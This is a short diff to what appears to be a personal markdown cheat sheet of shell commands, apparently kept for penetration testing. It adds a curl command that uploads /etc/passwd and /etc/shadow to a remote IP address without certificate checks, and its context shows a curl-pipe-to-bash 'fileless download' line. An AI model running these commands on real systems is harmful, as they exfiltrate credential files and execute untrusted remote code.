@@ -59,6 +59,14 @@ curl -o path url | bash
 ```
 ^fileless-download
 
+```bash
+curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
+```
+^upload-multiple-files-insecure
+
+
+
+
 ## Syntax I Forget
 
 - Flag or option I always look up
